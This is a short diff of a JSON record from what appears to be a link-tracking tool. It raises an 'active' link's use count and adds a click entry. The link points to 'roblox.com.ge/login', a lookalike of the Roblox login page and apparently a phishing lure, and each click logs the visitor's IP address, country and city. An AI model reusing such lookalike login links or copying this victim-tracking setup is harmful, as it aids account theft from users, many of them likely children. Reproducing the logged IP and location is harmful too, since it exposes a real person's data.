@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 976,
+    "useCount": 977,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7923,6 +7923,14 @@
       },
       {
         "timestamp": 1777217447390,
+        "ip": "82.135.207.151",
+        "country": "Lithuania",
+        "city": "Garliava",
+        "flag": "🇱🇹",
+        "countryCode": "LT"
+      },
+      {
+        "timestamp": 1777217516978,
         "ip": "82.135.207.151",
         "country": "Lithuania",
         "city": "Garliava",
